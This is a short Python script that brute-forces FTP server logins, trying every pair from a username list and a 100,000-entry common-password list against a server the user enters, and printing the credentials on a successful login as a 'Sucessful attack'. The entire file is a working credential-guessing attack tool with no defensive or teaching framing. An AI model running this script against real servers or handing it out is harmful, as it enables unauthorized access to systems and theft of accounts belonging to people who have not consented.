def main():
    import ftplib
    import sys
    
    def brute_force(ip,users_file,passwords_file):
        try:
            ud=open(users_file,"r" ,encoding="utf8")
            pd=open(passwords_file,"r" ,encoding="utf8")
    
            users= ud.readlines()
            passwords= pd.readlines()
    
            for user in users:
                for password in passwords:
                    try:
                        print("[*] Trying to connect")
                        connect=ftplib.FTP(ip)
                        response=connect.login(user.strip(),password.strip())
                        print(response)
                        if "230 Login" in response:
                            print("[*]Sucessful attack")
                            print("User: "+ user + "Password: "+password)
                            sys.exit()
                        else:
                            pass
                    except ftplib.error_perm:
                        print("Cant Brute Force with user "+user+ "and password "+password)
                    connect.close
    
        except(KeyboardInterrupt):
             print("Interrupted!")
             sys.exit()
    
    ip=input("Enter FTP SERVER:")
    user_file = input("Enter the User file ( press enter to use default) : ").strip()
    if user_file == "":
        user_file = "Dics\\UserNames\\cirt-default-usernames.txt"
    passwords_file = input("Enter the Password file ( press enter to use default) : ").strip()
    if passwords_file =="":
        passwords_file = "Dics\\PassLists\\100k-most-used-passwords.txt"
    brute_force(ip,user_file,passwords_file)